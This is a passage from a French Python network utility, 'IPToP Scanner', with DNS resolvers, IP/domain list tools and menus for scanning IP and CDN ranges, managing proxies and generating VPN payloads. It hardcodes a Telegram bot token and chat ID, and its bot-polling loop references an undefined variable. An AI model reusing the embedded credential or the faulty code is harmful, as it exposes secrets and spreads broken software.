                hostname, _, _ = socket.gethostbyaddr(ip)
                return {'ip': ip, 'domain': hostname, 'status': 'OK'}
            except socket.herror:
                return {'ip': ip, 'domain': None, 'status': 'FAIL', 'error': 'No PTR record'}
            except socket.timeout:
                return {'ip': ip, 'domain': None, 'status': 'FAIL', 'error': 'Timeout'}
            except Exception as e:
                return {'ip': ip, 'domain': None, 'status': 'FAIL', 'error': str(e)}

        @classmethod
        def batch_resolve(cls, input_file: str, output_file: str = None, max_workers: int = 10) -> List[Dict]:
            """Résolution massique avec gestion de fichier"""
            try:
                with open(input_file, 'r') as f:
                    ips = [line.strip() for line in f if line.strip()]
                
                valid_ips = []
                invalid_ips = []
                
                for ip in ips:
                    if cls.is_valid_ip(ip):
                        valid_ips.append(ip)
                    else:
                        invalid_ips.append(ip)
                
                if invalid_ips:
                    print(f"{Fore.YELLOW}⚠ {len(invalid_ips)} adresses IP invalides ignorées{Style.RESET_ALL}")
                
                if not valid_ips:
                    print(f"{Fore.YELLOW}Aucune IP valide trouvée dans le fichier.{Style.RESET_ALL}")
                    return []

                print(f"{Fore.CYAN}⏳ Résolution de {len(valid_ips)} IPs (Threads: {max_workers})...{Style.RESET_ALL}")

                results = []
                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    futures = {executor.submit(cls.resolve_ip, ip): ip for ip in valid_ips}
                    for i, future in enumerate(as_completed(futures), 1):
                        result = future.result()
                        results.append(result)
                        progress = (i / len(valid_ips)) * 100
                        status = f"{Fore.GREEN}✓{Style.RESET_ALL}" if result['status'] == 'OK' else f"{Fore.RED}✗{Style.RESET_ALL}"
                        print(f"\r[{'#' * int(progress/5)}{' ' * (20 - int(progress/5))}] {progress:.1f}% | IP: {result['ip']} {status}", end='')

                if output_file:
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write("IP,Domain,Status,Error\n")
                        for r in results:
                            f.write(f"{r['ip']},{r.get('domain','')},{r['status']},{r.get('error','')}\n")
                    print(f"\n{Fore.GREEN}✅ Résultats sauvegardés dans {output_file}{Style.RESET_ALL}")

                success = sum(1 for r in results if r['status'] == 'OK')
                print(f"\n{Fore.CYAN}=== RAPPORT FINAL ===")
                print(f"IPs valides traitées: {len(valid_ips)}")
                print(f"IPs invalides ignorées: {len(invalid_ips)}")
                print(f"Succès: {Fore.GREEN}{success}{Style.RESET_ALL}")
                print(f"Échecs: {Fore.RED}{len(results)-success}{Style.RESET_ALL}")
                print(f"Taux de réussite: {success/len(results)*100:.1f}%{Style.RESET_ALL}")

                return results

            except Exception as e:
                print(f"\n{Fore.RED}❌ Erreur critique: {e}{Style.RESET_ALL}")
                return []

    @staticmethod
    def _validate_input_file(input_file: str) -> bool:
        """Valide l'existence et la lisibilité d'un fichier"""
        if not os.path.exists(input_file):
            print(f"{Fore.RED}❌ Erreur : Fichier introuvable {Style.RESET_ALL}")
            return False
        if not os.access(input_file, os.R_OK):
            print(f"{Fore.RED}❌ Erreur : Permission de lecture refusée {Style.RESET_ALL}")
            return False
        if os.path.getsize(input_file) == 0:
            print(f"{Fore.YELLOW}⚠ Avertissement : Fichier vide {Style.RESET_ALL}")
        return True

    @staticmethod
    def _safe_file_write(output_file: str, content: str) -> bool:
        """Écriture sécurisée dans un fichier avec vérification"""
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(content)
            return True
        except IOError as e:
            print(f"{Fore.RED}❌ Erreur écriture fichier : {e}{Style.RESET_ALL}")
            return False



    # ========================================================
    # Méthodes de gestion de fichiers
    # ========================================================

    # 1. Fractionnement de fichier intelligent
    @staticmethod
    def split_file(input_file: str, output_prefix: str, num_parts: int, max_line=None) -> None:
        """Fractionne un fichier en parties égales ou par nombre de lignes"""
        try:
            if not TextFileManager._validate_input_file(input_file):
                return

            if num_parts <= 0:
                print(f"{Fore.RED}❌ Nombre de parties invalide {Style.RESET_ALL}")
                return

            # Choix du mode de fractionnement
            if max_line:
                # Fractionnement par nombre de lignes
                with open(input_file, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                
                total_lines = len(lines)
                chunks = [lines[i:i + max_line] for i in range(0, total_lines, max_line)]
                
                for i, chunk in enumerate(chunks, 1):
                    output_file = f"{output_prefix}_part{i}.txt"
                    if TextFileManager._safe_file_write(output_file, ''.join(chunk)):
                        print(f"{Fore.GREEN}✅ Partie {i} créée ({len(chunk)} lignes) {Style.RESET_ALL}")
            else:
                # Fractionnement en parties égales
                file_size = os.path.getsize(input_file)
                part_size = file_size // num_parts + 1

                with open(input_file, 'rb') as f:
                    for i in range(1, num_parts + 1):
                        output_file = f"{output_prefix}_part{i}.txt"
                        with open(output_file, 'wb') as outfile:
                            remaining = file_size - f.tell()
                            outfile.write(f.read(min(part_size, remaining)))
                        print(f"{Fore.GREEN}✅ Partie {i} créée {Style.RESET_ALL}")

            print(f"{Fore.CYAN}✔ Opération terminée avec succès {Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}❌ Erreur critique : {e}{Style.RESET_ALL}")

    # 2. Fusion intelligente de fichiers
    @staticmethod
    def merge_files(input_files: List[str], output_file: str, remove_duplicates=False) -> None:
        """Fusionne des fichiers avec option de déduplication"""
        try:
            merged_content = []
            seen_lines = set()

            for file_path in input_files:
                if not TextFileManager._validate_input_file(file_path):
                    continue

                with open(file_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.rstrip('\n')
                        if remove_duplicates:
                            if line not in seen_lines:
                                seen_lines.add(line)
                                merged_content.append(line + '\n')
                        else:
                            merged_content.append(line + '\n')

            if TextFileManager._safe_file_write(output_file, ''.join(merged_content)):
                stats = f"{len(seen_lines)} lignes uniques" if remove_duplicates else f"{len(merged_content)} lignes"
                print(f"{Fore.GREEN}✅ Fusion réussie ({stats}) {Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}❌ Erreur lors de la fusion : {e}{Style.RESET_ALL}")

    # 3. Nettoyage avancé des doublons
    @staticmethod
    def remove_duplicates(input_file: str, output_file: str, 
                         ignore_case: bool = False, 
                         keep_empty: bool = False,
                         encoding: str = 'utf-8') -> None:
        """
        Supprime les doublons en conservant l'ordre original
        avec des options avancées.
        
        Args:
            input_file: Chemin du fichier d'entrée
            output_file: Chemin du fichier de sortie
            ignore_case: Si True, ignore la casse pour la détection des doublons
            keep_empty: Si False, supprime les lignes vides
            encoding: Encodage des fichiers
        """
        try:
            if not TextFileManager._validate_input_file(input_file):
                return

            unique_lines = OrderedDict()  # Préserve l'ordre d'insertion
            
            with open(input_file, 'r', encoding=encoding) as f:
                for line in f:
                    original_line = line
                    processed_line = line.strip()
                    
                    # Gestion des lignes vides
                    if not processed_line and not keep_empty:
                        continue
                        
                    # Clé de comparaison
                    key = processed_line.lower() if ignore_case else processed_line
                    
                    # Garde la première occurrence
                    if key not in unique_lines:
                        unique_lines[key] = original_line

            # Écriture du résultat
            if TextFileManager._safe_file_write(output_file, ''.join(unique_lines.values())):
                # Statistiques
                with open(input_file, 'r', encoding=encoding) as f:
                    total_lines = sum(1 for _ in f)
                
                removed = total_lines - len(unique_lines)
                print(f"{Fore.GREEN}✅ {removed} doublons supprimés")
                print(f"⚡ {len(unique_lines)} lignes uniques conservées")
                print(f"📁 Taille originale: {total_lines} lignes{Style.RESET_ALL}")

        except UnicodeDecodeError:
            print(f"{Fore.RED}❌ Erreur d'encodage. Essayez avec encoding='latin-1'{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}❌ Erreur lors de la déduplication : {e}{Style.RESET_ALL}")
            
    @staticmethod
    def separate_domains_and_ips(input_file: str, output_domains: str, output_ips: str, 
                                ignore_comments: bool = True, sort_results: bool = False) -> None:
        """Sépare les domaines et IPs avec options avancées"""
        try:
            if not TextFileManager._validate_input_file(input_file):
                return
    
            domains = []
            ips = []
            
            with open(input_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line or (ignore_comments and line.startswith('#')):
                        continue
                    
                    try:
                        ipaddress.ip_address(line)
                        ips.append(line)
                    except ValueError:
                        if any(c.isalpha() for c in line):  # Filtre basique pour les domaines
                            domains.append(line)
    
            # Tri optionnel
            if sort_results:
                domains = sorted(domains, key=lambda x: x.split('.')[-1])  # Tri par TLD
                ips = sorted(ips, key=lambda x: tuple(map(int, x.split('.'))))  # Tri IPs
    
            # Sauvegarde avec vérification
            success = True
            if domains:
                success &= TextFileManager._safe_file_write(output_domains, '\n'.join(domains))
            if ips:
                success &= TextFileManager._safe_file_write(output_ips, '\n'.join(ips))
            
            if success:
                stats = f"{Fore.GREEN}✅ {len(domains)} domaines | {len(ips)} IPs"
                print(f"{stats} ({'triés' if sort_results else 'non triés'}){Style.RESET_ALL}")
    
        except Exception as e:
            print(f"{Fore.RED}❌ Erreur lors de la séparation : {e}{Style.RESET_ALL}")
    
    @staticmethod
    def reorganize_by_extension(input_file: str, output_file: str, 
                              group_similar: bool = False) -> None:
        """Réorganise les fichiers par extension avec regroupement similaire"""
        try:
            if not TextFileManager._validate_input_file(input_file):
                return
    
            from collections import defaultdict
            ext_groups = defaultdict(list)
            
            with open(input_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    
                    ext = os.path.splitext(line)[1].lower()
                    if group_similar:
                        # Regroupe les extensions similaires (ex: .jpg, .jpeg)
                        ext = '.jpg' if ext in ['.jpeg','.jpg'] else ext
                        ext = '.tif' if ext in ['.tiff','.tif'] else ext
                    
                    ext_groups[ext].append(line)
    
            # Génération du contenu organisé
            content = []
            for ext in sorted(ext_groups.keys()):
                content.append(f"\n=== {ext if ext else 'Sans extension'} ===\n")
                content.extend(f"{line}\n" for line in sorted(ext_groups[ext]))
            
            if TextFileManager._safe_file_write(output_file, ''.join(content)):
                print(f"{Fore.GREEN}✅ {len(ext_groups)} groupes d'extensions créés{Style.RESET_ALL}")
    
        except Exception as e:
            print(f"{Fore.RED}❌ Erreur lors de la réorganisation : {e}{Style.RESET_ALL}")
            
    @staticmethod
    def convert_domains_to_ips(input_file: str, output_file: str,
                              timeout: int = 3, retries: int = 2) -> None:
        """Convertit les domaines en IPs avec système de cache"""
        try:
            if not TextFileManager._validate_input_file(input_file):
                return
    
            resolved = {}
            failed = []
            cache = {}
            
            with open(input_file, 'r', encoding='utf-8') as f:
                domains = [line.strip() for line in f if line.strip()]
            
            print(f"{Fore.CYAN}⚙ Résolution de {len(domains)} domaines...{Style.RESET_ALL}")
            
            for domain in domains:
                if domain in cache:
                    resolved[domain] = cache[domain]
                    continue
                    
                for attempt in range(retries):
                    try:
                        socket.setdefaulttimeout(timeout)
                        ip = socket.gethostbyname(domain)
                        resolved[domain] = ip
                        cache[domain] = ip  # Mise en cache
                        break
                    except (socket.gaierror, socket.timeout):
                        if attempt == retries - 1:
                            failed.append(domain)
                        continue
    
            # Génération du rapport
            report = [f"{domain},{ip}" for domain, ip in resolved.items()]
            if failed:
                report.append("\n# Échecs :\n" + "\n".join(failed))
            
            if TextFileManager._safe_file_write(output_file, "\n".join(report)):
                stats = f"{Fore.GREEN}✅ {len(resolved)} résolutions réussies"
                if failed:
                    stats += f" | {Fore.RED}{len(failed)} échecs{Style.RESET_ALL}"
                print(stats)
    
        except Exception as e:
            print(f"{Fore.RED}❌ Erreur lors de la conversion : {e}{Style.RESET_ALL}")
            
    @staticmethod
    def sort_domains_or_ips(input_file: str, output_file: str,
                           reverse: bool = False, group_by_type: bool = True) -> None:
        """Tri avancé avec options de regroupement"""
        try:
            if not TextFileManager._validate_input_file(input_file):
                return
    
            domains = []
            ips = []
            
            with open(input_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    
                    try:
                        ipaddress.ip_address(line)
                        ips.append(line)
                    except ValueError:
                        domains.append(line)
    
            # Tri personnalisé
            domains_sorted = sorted(domains, key=lambda x: x.split('.')[::-1], reverse=reverse)
            ips_sorted = sorted(ips, key=lambda x: tuple(map(int, x.split('.'))), reverse=reverse)
            
            # Génération du contenu
            content = []
            if group_by_type:
                if domains_sorted:
                    content.append("[DOMAINES]\n" + "\n".join(domains_sorted))
                if ips_sorted:
                    content.append("\n[ADDRESSES IP]\n" + "\n".join(ips_sorted))
            else:
                all_items = domains_sorted + ips_sorted
                content = "\n".join(sorted(all_items, key=lambda x: (not x[0].isdigit(), x)))
    
            if TextFileManager._safe_file_write(output_file, "\n".join(content)):
                stats = f"{Fore.GREEN}✅ {len(domains)} domaines | {len(ips)} IPs triés"
                print(f"{stats} ({'regroupés' if group_by_type else 'mixés'}){Style.RESET_ALL}")
    
        except Exception as e:
            print(f"{Fore.RED}❌ Erreur lors du tri : {e}{Style.RESET_ALL}")
            
    @staticmethod
    def convert_cidr_to_ips(input_file: str, output_file: str,
                           max_ips: int = 1000, skip_private: bool = True) -> None:
        """Conversion optimisée des plages CIDR"""
        try:
            if not TextFileManager._validate_input_file(input_file):
                return
    
            generated_ips = []
            skipped = []
            
            with open(input_file, 'r', encoding='utf-8') as f:
                cidrs = [line.strip() for line in f if line.strip()]
            
            print(f"{Fore.CYAN}⚙ Traitement de {len(cidrs)} plages CIDR...{Style.RESET_ALL}")
            
            for cidr in cidrs:
                try:
                    network = ipaddress.IPv4Network(cidr, strict=False)
                    
                    if skip_private and network.is_private:
                        skipped.append(cidr)
                        continue
                    
                    # Limiteur pour les grandes plages
                    if network.num_addresses > max_ips:
                        sample = list(network.hosts())[:max_ips]
                        generated_ips.extend(str(ip) for ip in sample)
                        print(f"{Fore.YELLOW}⚠ Plage {cidr} tronquée à {max_ips} IPs{Style.RESET_ALL}")
                    else:
                        generated_ips.extend(str(host) for host in network.hosts())
                
                except ValueError as e:
                    print(f"{Fore.YELLOW}⚠ CIDR ignoré {cidr}: {e}{Style.RESET_ALL}")
    
            # Sauvegarde avec commentaires
            report = []
            if skipped:
                report.append(f"# Plages privées ignorées ({len(skipped)}):\n# " + "\n# ".join(skipped))
            report.extend(generated_ips)
            
            if TextFileManager._safe_file_write(output_file, "\n".join(report)):
                stats = f"{Fore.GREEN}✅ {len(generated_ips)} IPs générées"
                if skipped:
                    stats += f" | {Fore.YELLOW}{len(skipped)} plages ignorées{Style.RESET_ALL}"
                print(stats)
    
        except Exception as e:
            print(f"{Fore.RED}❌ Erreur lors de la conversion CIDR : {e}{Style.RESET_ALL}")
            
    @staticmethod
    def extract_domains_and_ips(input_file: str, output_file: str,
                               min_domain_length: int = 4, validate_ips: bool = True) -> None:
        """Extraction intelligente depuis des fichiers complexes"""
        try:
            if not TextFileManager._validate_input_file(input_file):
                return
    
            import re
            from urllib.parse import urlparse
            
            domains = set()
            ips = set()
            
            # Expressions régulières optimisées
            ip_pattern = re.compile(r'\b(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b')
            domain_pattern = re.compile(r'\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b')
            
            with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                
                # Extraction des IPs
                for match in ip_pattern.finditer(content):
                    ip = match.group()
                    if not validate_ips or TextFileManager.DNSResolver.is_valid_ip(ip):
                        ips.add(ip)
                
                # Extraction des domaines depuis URLs et texte
                for match in domain_pattern.finditer(content):
                    domain = match.group().lower()
                    if len(domain) >= min_domain_length and not domain.startswith(('0.', '127.')):
                        domains.add(domain)
            
            # Filtrage supplémentaire
            final_domains = [d for d in domains if not d.split('.')[0].isdigit()]
            final_ips = list(ips)
            
            # Génération du rapport structuré
            report = [
                "=== DOMAINES EXTRACTES ===\n" + "\n".join(sorted(final_domains)),
                "\n\n=== ADRESSES IP EXTRACTES ===\n" + "\n".join(sorted(final_ips, key=lambda x: tuple(map(int, x.split('.')))))
            ]
            
            if TextFileManager._safe_file_write(output_file, "\n".join(report)):
                stats = f"{Fore.GREEN}✅ {len(final_domains)} domaines | {len(final_ips)} IPs"
                print(f"{stats} (détection automatique){Style.RESET_ALL}")
    
        except Exception as e:
            print(f"{Fore.RED}❌ Erreur lors de l'extraction : {e}{Style.RESET_ALL}")
            
# ==============================================
# BANNIÈRE D'ACCUEIL
# ==============================================

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def typewriter(text, delay=0.02):
    for char in text:
        console.print(char, end="", style="bold bright_cyan")
        time.sleep(delay)
    print()

console = Console()

def display_banner():
    banner_text = Text()
    banner_text.append("✨ Saint 👏 Saint Saint Est Le Tout Puissant 🙏 ✨\n", style="bold magenta")
    banner_text.append("\n")
    banner_text.append("━━━   DjahNoDead 🕵️‍♂️  ━━━\n", style="bold orange1")

    panel = Panel(
        banner_text,
        border_style="bright_blue",
        title="[bold bright_cyan]Bienvenue",
        subtitle="[bold bright_green]Que la force soit avec toi !"
    )

    with Progress(
        SpinnerColumn(style="bold bright_green"),
        TextColumn("[progress.description]{task.description}"),
        transient=True,
    ) as progress:
        progress.add_task(description="[bold bright_yellow]Chargement du programme...", total=None)
        time.sleep(2)

    console.print(panel)

def main():
    console.clear()
    typewriter(">> Lancement du système... Patientez...\n", delay=0.05)
    time.sleep(1)
    console.clear()  # Efface tout l’écran, y compris le message
    
if __name__ == "__main__":
    main()
# ==============================================
# MENUS INTERACTIFS
# ==============================================

def main_menu():
    print(Fore.MAGENTA + "╔" + "═"*48 + "╗")
    print(Fore.MAGENTA + "║" + Style.BRIGHT + Fore.CYAN + "       MENU PRINCIPAL — SÉLECTION RAPIDE       " + Style.RESET_ALL + Fore.MAGENTA + "║")
    print(Fore.MAGENTA + "╚" + "═"*48 + "╝")

    # Outils généraux
    print(Fore.GREEN + "\n╭─── Outils généraux ───────────────────────────╮")
    print(Fore.CYAN + " 1. 🔎  Scanner une plage d'IP")
    print(Fore.CYAN + " 2. 📂  Scanner à partir d'un fichier")
    print(Fore.CYAN + " 3. 🌐  Outils de recherche de domaines")
    print(Fore.CYAN + " 4. 🧾  Gérer les fichiers textes")
    print(Fore.CYAN + " 5. 💦  Gérer les proxies")
    print(Fore.CYAN + " 6. 🛰️  Générateur de Payload VPN Pro")

    # Fournisseurs cloud
    print(Fore.GREEN + "\n╭─── Analyse des fournisseurs CDN / Cloud ─────╮")
    print(Fore.CYAN + " 7.  ☁️   Cloudflare")
    print(Fore.CYAN + " 8.  📦  CloudFront")
    print(Fore.CYAN + " 9.  ☁️   Google Cloud")
    print(Fore.CYAN + " 10.  ⚡  Fastly")
    print(Fore.CYAN + " 11. 🛰️   Akamai")
    print(Fore.CYAN + " 12. ☁️   Azure")
    print(Fore.CYAN + " 13. 🌐  StackPath")
    print(Fore.CYAN + " 14. 🌍  GCore")
    print(Fore.CYAN + " 15. 💢  Bunny")
    print(Fore.CYAN + " 16. 💫  Imperva")
    print(Fore.CYAN + " 17. 🌠  Sucuri")
    
    # Assistance
    print(Fore.BLUE + "\n╭─── Assistance & Aide ────────────────────────╮")
    print(Fore.CYAN + " 98. 🧼 Nettoyer le dossier temporaire (.tmp)")
    print(Fore.CYAN + " 99. 📬  Messagerie & Aide")

    # Quitter
    print(Fore.RED + "\n╭─── Sortie ───────────────────────────────────╮")
    print(Fore.RED + Style.BRIGHT + " 0. ❌  Quitter" + Style.RESET_ALL)

    print(Fore.MAGENTA + "\n" + "═"*52)
    choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choisissez une option (0-99) : ")
    return choice
# ==============================================
    
def text_file_menu():
    console.print("\n[bold white]===[ IPToP ]===\n[/bold white]")
    print(Fore.LIGHTMAGENTA_EX + "\n🧾 GESTION DES FICHIERS TEXTES")
    print(Fore.LIGHTMAGENTA_EX + "-" * 48)

    print(Fore.CYAN + " 1. ✂️  Fractionner un fichier texte")
    print(Fore.CYAN + " 2. 🔗 Fusionner plusieurs fichiers")
    print(Fore.CYAN + " 3. 🧹 Supprimer les doublons")
    print(Fore.CYAN + " 4. 🧮 Séparer domaines et IP")
    print(Fore.CYAN + " 5. 📂 Réorganiser par extensions")
    print(Fore.CYAN + " 6. 🌐 Convertir domaine en IP")
    print(Fore.CYAN + " 7. ↕️  Trier domaines ou IP")
    print(Fore.CYAN + " 8. 📍 Convertir CIDR en IP")
    print(Fore.CYAN + " 9. 🕵️  Extraire domaines & IP depuis un fichier")
    print(Fore.CYAN + " 10. 👽 Résolution DNS (IP->Domaine)")  # Nouvelle option
    print(Fore.CYAN + " 0. ↩️  Retour au menu principal")

    choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choisissez une option (0-9) : ")
    return choice
    
def proxy_menu():
    console.print("\n[bold orange]===[ IPToP ]===\n[/bold orange]")
    print(Fore.LIGHTBLUE_EX + "\n🛰️  GESTION DES PROXIES")
    print(Fore.LIGHTBLUE_EX + "=" * 40)

    print(Fore.CYAN + " 1. ♻️  Mettre à jour la liste des proxies")
    print(Fore.CYAN + " 2. 🎯 Sélectionner un proxy")
    print(Fore.CYAN + " 3. ✅ Afficher les proxies valides")
    print(Fore.CYAN + " 4. 🔎 Vérifier les proxies existants")
    print(Fore.CYAN + " 0. ↩️ Retour au menu principal")

    choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-5) : ")
    return choice

# ==============================================
# FONCTIONS 'UTILITAIRES
# ==============================================

def format_url(host):
    if not host.startswith("http://") and not host.startswith("https://"):
        return f"http://{host}"
    return host

def menu_messagerie():
    while True:
        console.print("\n[bold green]===[ IPToP ]===\n[/bold green]")
        print(Fore.MAGENTA + "\n╔═══════════════════════════════════════════════╗")
        print(Fore.MAGENTA + "║" + Fore.CYAN + Style.BRIGHT + "         📬 MESSAGERIE & AIDE INTERACTIVE        " + Style.RESET_ALL + Fore.MAGENTA + "║")
        print(Fore.MAGENTA + "╚═══════════════════════════════════════════════╝\n")

        print(Fore.CYAN + " 1. ✉️  Envoyer un message à l’auteur")
        print(Fore.CYAN + " 2. 📖 Lire le guide / aide intégrée")
        print(Fore.CYAN + " 3. 🤖 Lire les derniers messages du bot Telegram")
        print(Fore.CYAN + " 4. 💬 Poser une question au bot assistant")
        print(Fore.CYAN + " 5. 🗂️  Voir l’historique des questions")
        print(Fore.CYAN + " 6. 🧼 Réinitialiser l’historique")
        print(Fore.CYAN + " 0. ↩️  Retour au menu principal")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choisissez une option : ").strip()

        if choice == "1":
            send_feedback_to_telegram()
        elif choice == "2":
            readme()
            input(Fore.MAGENTA + "\nAppuie sur Entrée pour continuer...")
        elif choice == "3":
            lire_messages_du_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entrée pour continuer...")
        elif choice == "4":
            parler_au_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entrée pour continuer...")
        elif choice == "5":
            voir_historique_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entrée pour continuer...")
        elif choice == "6":
            reinitialiser_historique_bot()
            input(Fore.MAGENTA + "\nAppuie sur Entrée pour continuer...")
        elif choice == "0":
            break
        else:
            print(Fore.RED + "❌ Option invalide.")

def parler_au_bot():
    print(Fore.CYAN + "\n🤖 Pose ta question au bot (ex : option 1, cloudflare, help)")
    question = input(Fore.YELLOW + "Ta question : ").strip()

    if not question:
        print(Fore.RED + "❌ Question vide.")
        return

    BOT_TOKEN = "8011181087:AAHNUut9CCJnqEL0g1k_MCGQsFrd3f668Zk"
    CHAT_ID = "5950978436"

    url_send = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    url_get = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"

    try:
        requests.post(url_send, data={"chat_id": CHAT_ID, "text": question})
    except Exception as e:
        print(Fore.RED + f"Erreur d'envoi : {e}")
        return

    print(Fore.BLUE + "\n⌛ Attente de la réponse du bot...")

    response = None
    for _ in range(15):
        time.sleep(1)
        try:
            url = format_url(host)
            r = requests.get(url, timeout=5)
            updates = r.json().get("result", [])
            if updates:
                last = updates[-1].get("message", {}).get("text", "")
                if last and last != question and last != response:
                    response = last
                    print(Fore.GREEN + "\n🤖 Réponse du bot :\n" + Fore.RESET + response)
                    break
        except:
            pass

    if not response:
        print(Fore.RED + "⏱️ Aucune réponse du bot reçue.")
        response = "Aucune réponse reçue."

    # Logging
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{now}]\nQuestion : {question}\nRéponse : {response}\n\n"

    try:
        with open(".ipt_bot.log", "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        print(Fore.RED + f"Erreur lors de l’écriture dans .ipt_bot.log : {e}")

    try:
        os.makedirs("logs", exist_ok=True)
        filename = datetime.now().strftime("logs/botlog_%Y-%m-%d_%H-%M.txt")
        with open(filename, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        print(Fore.RED + f"Erreur lors de la sauvegarde dans les logs : {e}")
            
def lire_messages_du_bot():
    print(Fore.CYAN + "\n📬 Récupération des derniers messages du bot...\n")

    BOT_TOKEN = "8011181087:AAHNUut9CCJnqEL0g1k_MCGQsFrd3f668Zk"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"

    try:
        r = requests.get(url, timeout=10)
        updates = r.json()

        messages = []
        for update in updates.get("result", [])[-5:]:  # Derniers 5 messages
            msg = update.get("message", {}).get("text", "")
            if msg:
                messages.append(msg)

        if not messages:
            print(Fore.YELLOW + "Aucun message trouvé.")
            return

        print(Fore.GREEN + "=== Réponses du bot ===\n")
        for i, msg in enumerate(messages, 1):
            print(f"{Fore.MAGENTA}[{i}] {Fore.RESET}{msg}\n")
    except Exception as e:
        print(Fore.RED + f"Erreur : impossible de lire les messages. {e}")

def voir_historique_bot():
    log_path = ".ipt_bot.log"
    
    if not os.path.exists(log_path):
        print(Fore.YELLOW + "\n📭 Aucun historique trouvé pour le moment.")
        return

    print(Fore.CYAN + "\n=== Historique des questions au bot ===\n")
    
    try:
        with open(log_path, "r", encoding="utf-8") as f:
            lignes = f.readlines()

        bloc = []
        for line in lignes:
            if line.startswith("["):
                if bloc:
                    afficher_bloc_bot(bloc)
                    bloc = []
            bloc.append(line)
        if bloc:
            afficher_bloc_bot(bloc)

    except Exception as e:
        print(Fore.RED + f"❌ Erreur de lecture du fichier : {e}")

def afficher_bloc_bot(bloc):
    for line in bloc:
        if line.startswith("["):
            print(Fore.YELLOW + line.strip())
        elif line.startswith("Question"):
            print(Fore.BLUE + line.strip())
        elif line.startswith("Réponse"):
            print(Fore.GREEN + line.strip())
        else:
            print(Fore.RESET + line.strip())
    print(Fore.MAGENTA + "-" * 40)

def reinitialiser_historique_bot():
    log_path = ".ipt_bot.log"
    
    if not os.path.exists(log_path):
        print(Fore.YELLOW + "\n📭 Aucun fichier d’historique à supprimer.")
        return

    confirm = input(Fore.RED + "⚠️ Es-tu sûr de vouloir supprimer tout l’historique ? (o/n) : ").strip().lower()
    if confirm == "o":
        try:
            os.remove(log_path)
            print(Fore.GREEN + "🧹 Historique supprimé avec succès.")
        except Exception as e:
            print(Fore.RED + f"❌ Échec de la suppression : {e}")
    else:
        print(Fore.CYAN + "✅ Annulé. L’historique est conservé.")

def readme():
    console.print("\n[bold white]===[ IPToP ]===\n[/bold white]")
    print(Fore.GREEN + "\nBienvenue dans IPToP Scanner – Internet Pour Tous Ou Personne.")
    print(Fore.YELLOW + "\n=== AIDE / GUIDE D’UTILISATION ===\n")
    
    print(Fore.CYAN + "1. Scanner une plage d’IP :")
    print("   > Scanne tous les hôtes d’un réseau (ex: 192.168.1.0/24) pour détecter ceux qui sont actifs.")
    print("   > Supporte tous les modes proxy (automatique et scan ) et le mode turbo pour plus de rapidité.")

    print(Fore.CYAN + "\n2. Scanner à partir d’un fichier :")
    print("   > Charge une liste d’IP ou de domaines depuis un fichier et les scanne.")
    print("   > Pratique pour les scans ciblés.")

    print(Fore.CYAN + "\n3. Recherche de domaines :")
    print("   > Récupère les sous-domaines d’un domaine donné via les meilleurs sources.")
    print("   > Effectue plusieurs taches sur ces derniers à votre demande (résolution d'IP, extraction de domaine, etc...)")

    print(Fore.CYAN + "\n4. Gérer les fichiers textes :")
    print("   > Outils pour fractionner, fusionner, nettoyer, convertir, trier et manipuler des fichiers contenant IPs / domaines.")
    print("   > Parfait pour préparer ou analyser des listes personnalisées.")

    print(Fore.CYAN + "\n5. Gérer les proxies :")
    print("   > Met à jour la liste des proxies, les valide et permet d’en sélectionner un manuellement ou automatiquement.")
    print("   > Le mode turbo utilise plus de threads pour des scans rapides.")

    print(Fore.CYAN + "\n6. Scanner Cloudflare :")
    print("   > Scanne les plages CIDR connues de Cloudflare à la recherche d’hôtes exposés.")
    print("   > Gestion de la reprise automatique et historique de scan.")

    print(Fore.CYAN + "\n7. Générateur de Payload VPN :")
    print("   > Créer des charges utiles spécifique")
    print("   > Tester la connectivité de plusieurs payload efficacement.")

    print(Fore.CYAN + "\n8 à 17. Scanner CloudFront et 9 autres fournisseurs CDN/Cloud.")
    print("   > Identique à Cloudflare mais ciblé sur les plages IP d’Amazon CloudFront, Google Cloud, Fastly, Akamai, Azure, ...")

    print(Fore.CYAN + "\n98. Nettoyer le dossier temporaire (.tmp) :")
    print("   > Nettoye les fichiers générés après les scannes s'il deviennent trop nombreux.")
    print("   > Je precise néanmoins qu'ils sont utiles dans la reprise des scannes.")

    print(Fore.CYAN + "\n99. Messagerie & Aide :")
    print("   > Ce que tu es en train de lire maintenant. Lire ce guide 👉Option2.")
    print("   > Envoyer un message à l’auteur.")
    print("   > Ouvre un champ libre pour donner ton avis, signaler un bug ou poser une question.")
    print("   > Ton identifiant est anonymisé automatiquement.")
    print("   > Lire les réponses du bot.")
    print("   > Affiche les derniers messages d’aide publiés en direct depuis Telegram.")
    
    print(Fore.CYAN + "\n0. Quitter :")
    print("   > Ferme le programme proprement.")

